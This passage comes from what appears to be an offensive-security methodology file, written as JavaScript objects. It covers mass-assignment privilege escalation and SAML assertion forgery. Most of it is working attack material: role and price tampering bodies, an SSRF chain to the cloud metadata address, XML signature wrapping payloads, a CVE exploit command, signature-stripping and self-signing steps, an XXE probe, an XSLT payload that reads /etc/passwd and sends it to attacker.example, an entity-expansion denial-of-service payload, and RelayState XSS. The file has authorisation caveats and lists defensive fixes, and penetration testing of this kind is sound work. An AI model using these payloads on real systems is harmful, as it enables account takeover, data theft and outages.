        heading: 'Escalate privilege by binding role fields',
        body: [
          'Take a legitimate update request the app already accepts and add a privileged field to the body. If the response reflects the new value or a later read shows it persisted, the endpoint mass assigns. Role and admin flags are the direct path to takeover; a re authentication or a fresh token then carries the elevated rights.',
        ],
        examples: [
          { code: "PUT /api/users/123   {\"firstName\":\"Sam\",\"roles\":[{\"name\":\"ADMIN\"}]}   or   {\"isAdmin\":true}", note: 'If persisted, the account gains administrative rights on the next authenticated action.' },
        ],
      },
      {
        heading: 'Tamper with ownership and business fields',
        body: [
          'Beyond roles, bind the fields that hold money, state, and ownership. Nested binding reparents an object into another tenant, and business fields on a checkout or refund endpoint let you set your own price or refund. Because binding precedes the business logic, values the server meant to compute are overwritten by your input.',
        ],
        examples: [
          { code: "Reparent:  {\"profile\":{\"organizationId\":7}}   or   {\"order\":{\"owner\":{\"id\":7}}}", note: 'Nested autobinding moves the record into a tenant or owner you choose.' },
          { code: "Checkout tamper:  {\"items\":[...],\"price\":0.01,\"refundAmount\":9999.99,\"status\":\"PAID\"}", note: 'Writable money and status fields let you buy for nothing or mark an order paid.' },
        ],
      },
      {
        heading: 'Spoof trust flags and chain backend fields',
        body: [
          'Verification and trust flags are often plain columns, so binding emailVerified or a KYC status marks the account trusted without doing any verification. Backend processing fields are the dangerous chain: if a bindable templateId, webhookUrl, or filePath reaches server code, mass assignment becomes the delivery vehicle for SSRF, file read, or template injection.',
        ],
        examples: [
          { code: "Trust spoof:  {\"emailVerified\":true,\"kycStatus\":\"APPROVED\"}", note: 'Claims a verified, trusted identity the user never actually proved.' },
          { code: "Chain:  {\"webhookUrl\":\"http://169.254.169.254/latest/meta-data/\"}   bound then fetched by the backend", note: 'A writable processing field turns mass assignment into SSRF or file access.' },
        ],
      },
      {
        heading: 'Framework patterns and defenses',
        body: [
          'The vulnerable idiom is binding the raw body straight to a model: Mongoose findByIdAndUpdate(id, req.body), Rails update(params[:user]), Laravel guarded set to empty, Django fields set to all, Spring or ASP.NET saving a request bound entity. Fix it with an explicit allowlist per endpoint (Rails strong parameters permit, Laravel fillable), a dedicated DTO or view model that contains only the safe fields, rejecting unknown fields (Pydantic extra forbid, DisallowUnknownFields), marking privileged fields read only or json ignored, and moving privilege and ownership changes to separate admin only endpoints with their own authorization.',
        ],
        examples: [
          { code: "Vulnerable:  User.findByIdAndUpdate(req.params.id, req.body)   /   @user.update(params[:user])   /   protected $guarded = [];", note: 'Each binds every request key onto the model with no allowlist.' },
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Inject role, roles, isAdmin, or permissions into a create or update body so a self service endpoint grants the attacker administrative rights.',
          'Bind a status or account type field that gates privileged features to promote the account past its intended tier.',
          'Set a bindable backend processing field (templateId, webhookUrl, filePath) that chains into SSRF, file read, or template injection for deeper compromise.',
        ],
        why: 'Autobinding writes the properties before any authorization rule runs, so privilege fields the developer assumed were server controlled become directly settable by the user.',
      },
      tampering: {
        weaponization: [
          'Overwrite business fields such as price, discount, balance, refundAmount, or status to manipulate transactions and stored state.',
          'Reparent a record into another tenant or owner through nested binding of ownerId, organizationId, or a nested owner object.',
          'Change fields the server intended to compute so the persisted object reflects attacker chosen values.',
        ],
        why: 'Because the bind happens before business logic and without an allowlist, the attacker rewrites protected columns and moves objects across ownership boundaries at will.',
      },
      spoofing: {
        weaponization: [
          'Bind emailVerified, verified, or a KYC status to mark the account as a trusted, proven identity without performing any verification.',
          'Set an identity or ownership field (userId, ownerId) so actions and records appear to belong to another user.',
        ],
        why: 'Trust and identity flags are frequently ordinary bindable columns, so writing them lets the attacker present a verified or different identity they never legitimately hold.',
      },
    },
  },

  {
    id: 'saml-attacks',
    name: 'SAML Assertion Forgery and XML Signature Wrapping',
    summary: 'Make a service provider accept a SAML assertion that names someone else, by exploiting the gap between the XML element the signature covers and the element the service provider actually reads identity from.',
    tags: ['authentication', 'sso', 'xml'],
    executionContext: {
      where: 'In the service provider assertion consumer service on the SP host: the XMLDSig verification code and the DOM traversal that reads the NameID and attribute statements out of the assertion.',
      detail: "The identity provider is normally not attacked at all. The attacker holds the SAML Response in their own browser, edits it in a proxy, and posts it back to the SP assertion consumer service (ACS) URL, so the vulnerable code is the SP's SAML library: the signature verification routine, the reference resolution that decides which element was signed, and the getElementsByTagName style read that pulls the subject and attributes out. The flaw and the effect are in the same place, which is why a hardened IdP protects nothing. Two sub-variants execute somewhere else and are worth separating: XSLT transforms and DTD entities inside the signature or the document are processed by the SP's XML stack before verification and therefore run with the SP process privileges on the SP host, which turns this into file read and SSRF; and RelayState reflection runs in the victim browser in the SP origin. When the target is instead the IdP AuthnRequest endpoint, the parsing runs on the IdP host with IdP privileges. The result of a successful forgery is a real, fully valid application session at the SP, indistinguishable from a genuine login except in the IdP logs, which the SP never consults.",
    },
    howTo: [
      {
        heading: 'The flow, and which bytes actually carry identity',
        body: [
          'In SP-initiated browser SSO the SP builds a samlp:AuthnRequest and redirects the browser to the IdP. The IdP authenticates the user however it likes, then returns a samlp:Response whose body contains one saml:Assertion. The browser posts that Response to the SP ACS URL. Every byte of it has passed through the attacker machine, which is the whole point: the SP and the IdP never talk to each other directly.',
          'Identity lives in exactly two places inside the Assertion. saml:Subject/saml:NameID is who you are, and the saml:AttributeStatement carries the claims most applications use for authorization: group membership, role, email, employee id. Everything else in the document is plumbing. When you attack SAML you are trying to control those two elements while leaving something that still passes signature verification.',
          'Read the trust boundary carefully. The signature can cover the whole samlp:Response, or just the saml:Assertion, or both, and which one it covers decides what you can freely edit. In the very common configuration where only the Assertion is signed, the Response wrapper is unsigned attacker controlled data: samlp:Status, Destination, and InResponseTo can all be rewritten without touching the signature. Flipping a Status of AuthnFailed or Requester to Success on an otherwise genuine failed-login Response is the cheapest test in the whole methodology.',
          'Also note the messages you can reach beyond login. Single Logout (LogoutRequest and LogoutResponse) goes through the same verification code with the same bugs, and IdP metadata endpoints hand you the entityID, the ACS URLs, and the signing certificate for free.',
        ],
        examples: [
          { code: 'Find SPs:  /saml/acs  /saml2/acs  /Shibboleth.sso/SAML2/POST  /saml/SSO  /simplesaml/module.php/saml/sp/saml2-acs.php/default-sp  /cgi/samlauth', note: 'Common assertion consumer service paths. A POST here with a SAMLResponse body parameter is the attack surface.' },
          { code: 'Metadata:  /saml/metadata  /Shibboleth.sso/Metadata  /simplesaml/module.php/saml/sp/metadata.php/default-sp', note: 'Gives you the SP entityID (the value Audience must match), the exact ACS URL, and often the certificates in use.' },
          { code: 'Identity bytes:  <saml:NameID>you@corp.example</saml:NameID>  and  <saml:Attribute Name="groups"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>', note: 'These two elements are the target of every forgery below. Everything else is scaffolding you keep valid enough to reach them.' },
        ],
      },
      {
        heading: 'Capture and decode: the two bindings differ',
        body: [
          'You cannot test what you cannot read, and the encoding differs by binding. The HTTP-POST binding (used for the Response almost everywhere) is base64 only, inside a form field named SAMLResponse. The HTTP-Redirect binding (used for the AuthnRequest and for logout) is raw DEFLATE, then base64, then URL encoding, in a query parameter named SAMLRequest or SAMLResponse. Guessing wrong makes a valid message look like garbage, so try base64 first and fall back to raw inflate.',
          'Raw DEFLATE means no zlib header, which in Python is a window size of -15. This trips people up constantly: zlib.decompress on the base64 output fails until you pass the negative window bits.',
          'Decode, edit, re-encode, replay. Keep the untouched original in a file so you always have a known-good baseline to diff against, and record what a successful login and a failed login each look like before you start changing bytes, because most of the checks below are judged on whether the response changed.',
        ],
        examples: [
          { code: 'printf %s "$SAMLResponse" | python3 -c "import sys,base64,urllib.parse as u; sys.stdout.write(base64.b64decode(u.unquote(sys.stdin.read())).decode())" | xmllint --format -', note: 'HTTP-POST binding: URL decode, base64 decode, pretty print. No inflate step.' },
          { code: 'printf %s "$SAMLRequest" | python3 -c "import sys,base64,zlib,urllib.parse as u; print(zlib.decompress(base64.b64decode(u.unquote(sys.stdin.read())), -15).decode())"', note: 'HTTP-Redirect binding: the -15 window size is raw DEFLATE. Without it this throws an incorrect header check error.' },
          { code: 'cat resp.xml | python3 -c "import sys,base64,zlib,urllib.parse as u; d=sys.stdin.buffer.read(); c=zlib.compressobj(9,zlib.DEFLATED,-15); print(u.quote(base64.b64encode(c.compress(d)+c.flush()).decode()))"', note: 'Re-encode an edited message for the Redirect binding. For the POST binding just base64 the file with no compression.' },
          { code: 'samltool.com  (OneLogin) for quick decode, inflate, and signature inspection in a browser', note: 'Convenient, but it is a third party site: never paste a live production assertion into it. Use the local commands for real engagements.' },
        ],
      },
      {
        heading: 'Map what the signature actually covers, before you attack it',
        body: [
          'Every wrapping attack depends on one question: which element does ds:Reference URI point at, and is that the same element the application reads the NameID from? Find the ds:Signature blocks, read each ds:Reference URI value, and match it to the ID attribute of an element in the document. Then decide whether the signature is enveloped (inside the thing it signs), enveloping (the signed data sits inside a ds:Object under the Signature), or detached (elsewhere in the document entirely). Wrapping attacks are the art of moving that relationship around.',
          'Verify the signature yourself offline so you know for certain what verifies and what does not. xmlsec1 takes the IdP certificate and the name of the ID attribute, and will tell you plainly whether a reference resolves and validates. This matters because a mangled document that fails signature checks and a mangled document that passes them but is read wrongly look identical from the outside.',
          'Do the baseline validity tests first, in this order, because each one that succeeds makes the harder attacks unnecessary: flip one character of the DigestValue, flip one character of the SignatureValue, change the NameID and leave the signature alone. If the SP still logs you in, there is no verification at all and you are done. Only when all three are correctly rejected do you need XSW.',
        ],
        examples: [
          { code: 'xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion resp.xml', note: 'Verify the Assertion signature locally. Swap the last URN for ...:protocol:Response to check a Response level signature.' },
          { code: 'Read:  <ds:Reference URI="#_a1b2c3"/>   then find  <saml:Assertion ID="_a1b2c3">', note: 'That match is the entire trust relationship. If nothing in the document has that ID, or two elements do, you already have a finding.' },
          { code: 'Baseline 1:  change one byte of <ds:DigestValue>   Baseline 2:  change one byte of <ds:SignatureValue>   Baseline 3:  change the NameID only', note: 'All three must be rejected. Any acceptance means signature verification is absent or fail-open, which is a critical on its own.' },
        ],
      },
      {
        heading: 'Signature stripping and signature exclusion',
        body: [
          'A large family of SAML libraries only verify a signature when one is present. Remove every ds:Signature element from the document, set the NameID to a user you want to be, and post it. If the SP accepts it you have unauthenticated impersonation of anyone, with no IdP interaction at all. As Ioannis Kakavas put it, accepting an unsigned assertion is accepting a username without checking a password.',
          'Test the variants separately, because implementations guard them separately. Strip only the Assertion signature and leave the Response signature. Strip only the Response signature. Strip both. Move the whole Signature element out of the Assertion and leave it as a sibling. Replace the Signature with an empty ds:Signature element so that a presence check passes but there is nothing to verify.',
          'Fail-open configuration is the same class arriving by a different route. Products that expose a SAML ACS handler even when SSO was never configured often leave the verification mode, the trusted issuer, and the certificate path at language defaults such as an empty string or false, and a mode check written as a set membership test with no rejecting else branch simply falls through. This was the shape of the Synology DS925+ SSO bypass shown at Pwn2Own Ireland 2025. Always test the ACS endpoint on a target where SSO is disabled or was deleted, not only where it is configured.',
          'Related, and worth testing separately: omit whole elements rather than forging them. Some validators only check a Conditions element that exists, so deleting saml:Conditions entirely is easier than getting the timestamps right, and an Issuer that is whitespace only can pass a presence check while failing to match anything.',
        ],
        examples: [
          { code: 'SAML Raider (Burp) -> Remove Signatures, then edit the NameID, then Forward', note: 'The one click version. If the SP returns a session, signature enforcement is missing or fail-open.' },
          { code: 'Minimal forged Response: <samlp:Response ...><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion ...><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>', note: 'Schema valid, Status Success, one Assertion, attacker chosen NameID, no signature anywhere. The classic exclusion payload.' },
          { code: 'Empty shell:  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"></ds:Signature>', note: 'Defeats a naive if a signature element exists then it must have been checked assumption.' },
          { code: 'Identity forms to try when a plain name is rejected:  DOMAIN\\Administrator  administrator@corp.example  and the raw directory GUID', note: 'Forged names still have to survive account resolution at the SP, and directory style forms sometimes route around blocked-username checks.' },
        ],
      },
      {
        heading: 'XML Signature Wrapping (XSW1 through XSW8)',
        body: [
          'XSW is the central technique and it has nothing to do with breaking cryptography. Verification and consumption are two separate passes over the document. The verifier follows ds:Reference URI to one element and confirms its digest. The application then goes looking for the assertion with its own traversal, usually something like the first Assertion it finds, or the first NameID in document order. If you can arrange for those two passes to land on different elements, the IdP signature stays perfectly valid over the original assertion while the application reads a forged one you wrote by hand. This is the Somorovsky et al. USENIX Security 2012 result, Be Whoever You Want to Be, and it is still landing today.',
          'The eight canonical variants differ only in where the copy goes and what it wraps, which matters because each SP library has a different traversal quirk. Using FA for your forged assertion, LA for the legitimate one, and LAS for its signature: XSW1 and XSW2 target Response level signatures, adding a cloned unsigned Response after the existing signature (XSW1) or before it as a detached signature (XSW2). XSW3 adds FA as a sibling before LA. XSW4 makes LA a child of FA. XSW5 abandons all three standard signature configurations (enveloped, enveloping, detached) by making FA envelope LAS. XSW6 nests that one level further, so FA envelopes LAS which in turn envelopes LA. XSW7 hides FA inside an Extensions element, exploiting the looser schema there. XSW8 inverts XSW7 by moving the stripped LA into a ds:Object block, so the forged assertion is the one left in the position the application traverses to.',
          'Run all eight. Do not stop at the first failure, because they exercise genuinely different code paths and a library that resists XSW3 often falls to XSW7 or XSW8. Also vary the ID attributes: give your forged assertion a fresh unique ID, then try giving it the same ID as the original, then try leaving it with no ID at all. Duplicate ID handling is where a lot of these bugs actually live.',
          'The modern versions of this attack rarely require you to be clever about XML. CVE-2024-45409 in ruby-saml (and therefore in GitLab SAML SSO) meant any single IdP-signed document was enough to mint an assertion for any user. The GitHub Enterprise Server bypass CVE-2024-4985, and its incomplete-fix follow up CVE-2024-9487, came from signatures being extracted before decryption so that the inner signature of an encrypted assertion was never validated, letting an attacker wrap the original Response inside a ds:Object, point references at the wrapped copy, inject a forged Assertion, and encrypt the result to the SP public key. GHES is a versioned appliance you can fingerprint, so check the build: CVE-2024-4985 affects everything before 3.13.0 and is fixed in 3.9.15, 3.10.12, 3.11.10, and 3.12.4, while CVE-2024-9487 affects everything before 3.15, is fixed in 3.11.16, 3.12.10, 3.13.5, and 3.14.2, and additionally requires encrypted assertions to be enabled plus a signed SAML response or metadata document. If the target uses encrypted assertions, test that path separately: encryption often turns off the checks that were protecting you.',
        ],
        examples: [
          { code: '<samlp:Response>\n  <saml:Assertion ID="_evil">                       <!-- FA: forged, unsigned, first in document order -->\n    <saml:Subject><saml:NameID>admin@corp.example</saml:NameID></saml:Subject>\n  </saml:Assertion>\n  <saml:Assertion ID="_real">                       <!-- LA: untouched, still genuinely signed -->\n    <saml:Subject><saml:NameID>you@corp.example</saml:NameID></saml:Subject>\n    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_real"/></ds:SignedInfo></ds:Signature>\n  </saml:Assertion>\n</samlp:Response>', note: 'XSW3. The signature verifies over #_real. An SP that reads the first Assertion it encounters authenticates you as admin.' },
          { code: '<saml:Assertion ID="_evil">                          <!-- FA: forged, outermost, the one the app traverses to -->\n  <saml:Subject><saml:NameID>admin@corp.example</saml:NameID></saml:Subject>\n  <ds:Signature>\n    <ds:SignedInfo><ds:Reference URI="#_real"/></ds:SignedInfo>\n    <ds:Object>\n      <saml:Assertion ID="_real">... the genuine assertion, untouched ...</saml:Assertion>   <!-- LA hidden here -->\n    </ds:Object>\n  </ds:Signature>\n</saml:Assertion>', note: 'XSW8 shape: the stripped original is what hides inside ds:Object, which schema validation is permissive about because Object may contain anything, while the forged assertion keeps the outer position. Getting this the wrong way round produces a document that verifies and reads as the real user, which looks like the SP is patched when it is not.' },
          { code: 'SAML Raider -> XSW tab -> apply XSW1..XSW8 in turn, forwarding each and watching for a session cookie', note: 'The Burp extension automates the eight rearrangements. d0ge/XSW is a second extension worth running when SAML Raider produces nothing.' },
          { code: 'python3 CVE-2024-45409.py -d -e -r response.url_base64 -n admin@example.com -o response_patched.url_base64', note: 'Synacktiv PoC for the ruby-saml Response verification bypass. -d decodes URL plus base64 input and -e re-encodes the output; without both, the script reads the file as raw XML and writes raw XML back. Only useful against ruby-saml <= 1.12.2 or 1.13.0 to 1.16.0; fixed in 1.12.3 and 1.17.0.' },
        ],
      },
      {
        heading: 'Wrong key, self-signed certificates, and untrusted issuers',
        body: [
          'A signature being cryptographically valid says nothing about who made it. The SP must additionally decide that the key belongs to the IdP it trusts for this connection. Plenty do not: they read the certificate out of the ds:KeyInfo element in the message you sent them and validate against that, which is circular and lets you sign whatever you like.',
          'Test it by cloning. Take the real IdP certificate out of the response, produce a self-signed certificate with the same subject and issuer fields, strip the original signatures, and re-sign the Assertion (and the Response, separately) with your own private key. Acceptance proves the SP is not pinning the IdP key. SAML Raider does all of this from the certificate tab.',
          'Test issuer trust independently of key trust. Change saml:Issuer to a different entityID while keeping a valid signature from the original key, and separately keep the correct Issuer while signing with a different trusted key from elsewhere in the federation. Multi-tenant SaaS is the high-value case: if tenant A can present an assertion signed by tenant A IdP but bearing a NameID or Issuer belonging to tenant B, the tenant boundary is gone.',
          'Two more checks in this area that are cheap and often forgotten: whether an expired or revoked IdP certificate is still accepted, and whether the signature algorithm is pinned. An SP that accepts whatever ds:SignatureMethod you name will happily take rsa-sha1, and one that accepts an HMAC algorithm where an RSA key was expected is the SAML analogue of JWT algorithm confusion (see the JWT Attacks entry for that pattern).',
        ],
        examples: [
          { code: 'SAML Raider:  Send Certificate to SAML Raider Certs -> Save and Self-Sign -> Remove Signatures -> (Re-)Sign Assertion', note: 'Acceptance of the self-signed clone means the SP trusts any well formed signature rather than a pinned IdP key.' },
          { code: 'openssl x509 -in idp.crt -noout -text -fingerprint -sha256', note: 'Record the real thumbprint first. The fix for this whole class is pinning that value, so you need it to describe the finding.' },
          { code: 'Downgrade test:  <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>', note: 'OWASP requires RSA-SHA256 or stronger and rejecting SHA-1. An SP that follows whatever algorithm the message names is not pinning.' },
          { code: 'Cross-tenant:  keep your own tenant signature, change <saml:Issuer> or the NameID domain to the victim tenant', note: 'Tests whether the SP binds the signing key to the tenant, or just to the product.' },
        ],
      },
      {
        heading: 'Canonicalisation, comments, entities, and parser differentials',
        body: [
          'XML signatures are computed over a canonical form of the element, not over the literal bytes. Canonicalisation deliberately removes comments and normalises whitespace and namespaces, so that a document can be reserialised without breaking the signature. That is a feature, and it is also a whole vulnerability class, because the application reading the identity does not canonicalise: it walks a DOM. Anything canonicalisation erases but a DOM read notices is an opportunity.',
          'The comment truncation family (CVE-2017-11427 python-saml, CVE-2017-11428 ruby-saml, CVE-2017-11429 saml2-js, CVE-2017-11430 omniauth-saml, CVE-2018-0489 Shibboleth, CVE-2018-7340 Duo Network Gateway) is the canonical example, found by Duo Labs in 2018. Inserting a comment inside the NameID splits its text into two text nodes. Canonicalisation drops the comment and concatenates the text, so the signature still covers the full string; but a DOM read that takes the first child text node returns only the part before the comment. Register an identity at the IdP whose name is the victim name with your own suffix appended, log in legitimately, then insert the comment at the join. The signature is genuine, and the SP reads the victim. Note this needs an account at the IdP and control over your own username or email domain, and the named libraries have all been patched for years, so treat it as a test to run rather than a bug you expect to find in an up to date stack.',
          'The same shape reappears without comments. Entity references also split text nodes: PayloadsAllTheThings documents a Shibboleth case where an attribute value written as &s;taf&f1; canonicalises to the signed string staff1 while the application reports taf. Try entity references, CDATA sections, and stray whitespace at the same joins.',
          'The newest and most dangerous version is the parser differential, where two different XML parsers in the same code path disagree about document structure. In ruby-saml up to 1.17.0 (CVE-2025-25291 via DOCTYPE handling and CVE-2025-25292 via namespace handling, found by GitHub Security Lab) the assertion was canonicalised with Nokogiri while the hash it was compared against was extracted with REXML, so the digest and the signature each checked out while having no connection to each other. Anyone holding one valid signature could sign in as anyone. Fixed in 1.12.4 and 1.18.0. A cheaper cousin is XML round-tripping: if the SP parses and reserialises before verifying, feed it structures where the two operations disagree, which REXML 3.2.4 and earlier are documented to do.',
        ],
        examples: [
          { code: '<saml:NameID>admin@corp.example<!---->.evil.example</saml:NameID>', note: 'Comment truncation. Canonical text is admin@corp.example.evil.example (an account you own and legitimately signed in as); a first-text-node DOM read returns admin@corp.example.' },
          { code: '<saml:AttributeValue>&s;taf&f1;</saml:AttributeValue>   with  <!ENTITY s "s"><!ENTITY f1 "f1">  in the DOCTYPE', note: 'Entity variant of the same truncation: signed as staff1, read as taf. Try it on group and role attributes as well as on the NameID.' },
          { code: 'Probe:  insert <!---->, then <![CDATA[]]>, then a newline, at each identity boundary; diff the canonical text against what the app displays as your username', note: 'If the profile page shows less than the string you signed, you have found a truncation bug regardless of which library it is.' },
          { code: 'Parser differential probe:  add a DOCTYPE, add a second ds:Signature under a namespace prefix only one parser resolves, then diff which assertion the SP reports', note: 'The ruby-saml 2025 pattern. Check the SAML library version first; on ruby-saml, 1.12.4 and 1.18.0 are the fixed lines.' },
        ],
      },
      {
        heading: 'XXE and XSLT: code that runs before verification',
        body: [
          'A SAML Response is just an XML document that an SP parses, so every XML parser attack applies to it. The important detail, and the reason this is not simply a duplicate of the XXE entry, is ordering: the parsing and the signature transforms happen before the signature is verified. An invalid signature, a self-signed certificate, or no signature at all does not protect the target, because the payload has already been processed by the time the verification would have rejected it. This is a pre-authentication attack surface on an internet facing endpoint.',
          'For XXE, put a DOCTYPE at the top of the decoded document and reference an external entity from a text node the application will render or log, or use a parameter entity for a blind out-of-band probe. A DNS or HTTP hit on your collaborator proves the SP resolves external entities; from there you have file read on the SP host and SSRF from inside its network. See the XXE entry for the exfiltration DTD patterns.',
          'For XSLT, the vector is the ds:Transforms element inside the signature. The XSLT transform type is part of the XMLDSig specification, so a compliant implementation will execute an attacker supplied stylesheet while resolving what to hash. XSLT 2.0 unparsed-text reads a file, and fetching a URL built from its contents exfiltrates it. Read the SP library configuration in the report: the fix is to disallow the XSLT transform entirely, not to filter the stylesheet.',
          'Denial of service belongs to this section too. Entity expansion inside a SAML message is amplified twice, because the Redirect binding DEFLATE compresses the message before base64, so a document that expands to hundreds of megabytes travels as a few hundred bytes of query string. Test that carefully and with authorisation.',
        ],
        examples: [
          { code: '<?xml version="1.0"?>\n<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "http://YOURID.oastify.com/x">]>\n<samlp:Response ...>...<saml:NameID>&xxe;</saml:NameID>...', note: 'Out-of-band XXE probe. A collaborator hit proves external entity resolution; swap in file:///etc/passwd once confirmed.' },
          { code: '<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">\n  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0"><xsl:template match="/">\n    <xsl:variable name="f" select="unparsed-text(\'/etc/passwd\')"/>\n    <xsl:value-of select="unparsed-text(concat(\'http://attacker.example/\',encode-for-uri($f)))"/>\n  </xsl:template></xsl:stylesheet>\n</ds:Transform></ds:Transforms>', note: 'XSLT inside the signature transforms. Runs during signature processing, so it fires even when the signature is invalid.' },
          { code: '<!DOCTYPE Response [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>', note: 'Entity expansion. On the Redirect binding this compresses to almost nothing, so the amplification factor is enormous. Get explicit permission first.' },
          { code: 'SAML Raider generates XXE and XSLT proofs of concept directly from a captured request', note: 'Faster than hand editing, and it re-encodes the message for you.' },
        ],
      },
      {
        heading: 'Replay, and the conditions nobody checks',
        body: [
          'An assertion is a bearer token. Everything that protects it from reuse is a condition the SP is supposed to check and frequently does not. Work through them one at a time, changing exactly one thing per request so the result is attributable.',
          'Replay: post the same unmodified SAMLResponse a second time, and a tenth time. If each one mints a session, there is no one-time-use cache keyed on the assertion ID, and any assertion that leaks (proxy logs, browser history, a shared workstation, a Referer header) is a reusable credential. Then test the clock: set NotOnOrAfter and the Conditions NotOnOrAfter into the past, and separately delete the saml:Conditions element outright, since a validator that only checks conditions it can see treats absence as permission.',
          'Audience and Recipient: saml:Audience is supposed to equal the SP entityID and SubjectConfirmationData Recipient plus the Response Destination are supposed to equal the ACS URL. Change each to a random string in turn. If the SP does not enforce Audience, you have token recipient confusion: obtain a legitimate assertion from an SP you are allowed to use (SP-Legit), and post it to a different SP that trusts the same IdP (SP-Target). One valid login anywhere in the federation then becomes a login everywhere in it, which is a serious finding in any large SSO estate.',
          'InResponseTo: this is the CSRF token of SAML. It must echo the ID of the AuthnRequest the SP itself issued, and the SP must remember that it issued one. Delete it, then set it to a random value. Accepting either means unsolicited responses are allowed, which is inherent to IdP-initiated SSO: there is no request to bind to, so the check cannot exist. If a target supports IdP-initiated flows, say so in the report, because it means an attacker who obtains any valid assertion can force a victim browser into an attacker chosen session (login CSRF) via an auto-submitting form, and everything the victim then does happens in the attacker account.',
          'On the Redirect binding, the signature is not XMLDSig at all: it is a detached signature over the raw query string octets, carried in SigAlg and Signature parameters. Implementations that re-parse or re-encode the query rather than using the octets as received get this wrong, and duplicate parameters are the sharp edge. CVE-2025-27773 in simplesamlphp/saml2 is the reference case: the verifier used the last of SAMLRequest or SAMLResponse it iterated past while the processing logic preferred SAMLRequest, so prepending an unsigned SAMLRequest to a genuinely IdP-signed SAMLResponse got the signed one verified and the unsigned one consumed. Fixed in 4.17.0 and 5.0.0-alpha.20. Always test duplicate and reordered parameters on this binding.',
        ],
        examples: [
          { code: 'Replay:  POST the identical SAMLResponse body twice and compare Set-Cookie', note: 'Two sessions from one assertion means no replay cache. Note the assertion ID; that is what should be cached.' },
          { code: 'Expiry:  set NotOnOrAfter="2020-01-01T00:00:00Z"   then, separately, delete <saml:Conditions> entirely', note: 'Two different bugs. Deleting the element catches validators that only check what is present.' },
          { code: 'Audience:  <saml:Audience>https://not-this-sp.example</saml:Audience>   Recipient/Destination:  point at another SP', note: 'Any of these being ignored enables cross-SP replay of a legitimately issued assertion.' },
          { code: 'InResponseTo:  remove the attribute, then set InResponseTo="_deadbeef"', note: 'Acceptance means unsolicited responses are allowed, which enables forced login into an attacker session.' },
          { code: 'Redirect binding parameter confusion:  ?SAMLRequest=<unsigned>&SAMLResponse=<idp-signed>&SigAlg=...&Signature=...', note: 'The CVE-2025-27773 shape. Also try duplicating SAMLResponse and reordering RelayState, SigAlg, and Signature.' },
        ],
      },
      {
        heading: 'RelayState: open redirect, and worse',
        body: [
          'RelayState is opaque state the SP hands the IdP so it can return the user to where they started. Because it round trips through the IdP and comes back as an unvalidated parameter, SPs that treat it as a destination URL and redirect to it after a successful login have an open redirect that fires at the exact moment the user is most trusted: immediately after authenticating. Chain it the way the Open Redirect entry describes, and note that a post-login redirect is a much stronger phishing and token-theft primitive than a generic one.',
          'The spec says RelayState should not exceed 80 bytes and should be an opaque handle rather than a URL, so an implementation putting a full URL in it is already off-spec and worth calling out even before you weaponise it.',
          'Some endpoints do more than redirect: they decode RelayState and reflect it into the response. Where the decoded value reaches a header writing routine, newlines let you terminate the headers early, set your own Content-Type, and supply a body, which is response splitting into reflected XSS on the SP origin. HackTricks documents this against a NetScaler /cgi/logout endpoint. Deliver it with a cross-origin auto-submitting form, because the endpoint takes a POST.',
          'Separately, hunt XSS on the SSO plumbing itself rather than in the assertion. Logout and prompt endpoints that take a return URL parameter have a long history here, including the /oidauth/prompt base parameter accepting a javascript: URI across many Uber subdomains. These live on the identity origin, which is where session cookies are, so the impact is higher than a comparable bug elsewhere on the estate.',
        ],
        examples: [
          { code: 'RelayState=https://attacker.example/  then complete a normal login', note: 'Post-authentication open redirect. Confirm the final Location and whether any token or code rides along in the query or fragment.' },
          { code: 'RelayState = base64( "\\nContent-Type: text/html\\n\\n\\n<svg/onload=alert(document.domain)>" )', note: 'Header and body injection where the decoded value is written into the response. Yields XSS on the SP origin.' },
          { code: '/oidauth/prompt?base=javascript%3Aalert(document.domain)%3B%2F%2F&return_to=%2F', note: 'The Uber SSO pattern: a redirect target parameter on a logout or prompt page that accepts a javascript: URI.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'SAML Raider (Compass Security, in the Burp BApp Store) is the tool this methodology is built around: it decodes both bindings inline, lists and edits the assertion, applies XSW1 through XSW8 with a click, removes signatures, clones and self-signs certificates, re-signs the message or the assertion, and generates XXE and XSLT proofs of concept. d0ge/XSW is a second Burp extension worth running when SAML Raider finds nothing, and the ZAP SAML add-on covers detection, editing, and fuzzing if you are not on Burp. SAMLExtractor crawls a URL list for SAML consumer endpoints, which is how you find the ACS surface across a large estate.',
          'Keep a local verification loop so you always know whether a failure was cryptographic or logical: xmlsec1 --verify for signatures, xmllint --format for readability, and the python one-liners above for the transport encoding. On the defensive side, python-saml, ruby-saml, pysaml2, and simplesamlphp all have security advisories worth reading before you test a target that uses them, and the library version is often visible in the SP metadata or in error pages.',
          'A workable order of attack: enumerate ACS and metadata endpoints; capture and decode a real login; establish the baseline (digest, signature, and NameID tampering all rejected); strip signatures; run all eight XSW variants with three ID strategies each; self-sign; probe the canonicalisation and parser differential bugs; test XXE and XSLT; then work the conditions (replay, expiry, Audience, Recipient, Destination, InResponseTo); then RelayState. Stop and report as soon as you have a session, and never test the denial of service payloads without written permission.',
          'On reporting: a forged assertion produces a genuine session, so the proof is a screenshot of the SP showing the victim identity next to the exact bytes you sent. Include the decoded XML, the diff against the legitimate assertion, and which specific check was missing, because SP owners routinely misroute these to their IdP vendor. The fix always belongs to the SP: pin the IdP certificate, require a signature and reject on its absence, verify that the ds:Reference URI resolves to the very element whose NameID you consume, reject documents with more than one assertion, disable DTD and XSLT transforms in the parser, and enforce Audience, Recipient, Destination, NotOnOrAfter, InResponseTo, and one-time use.',
        ],
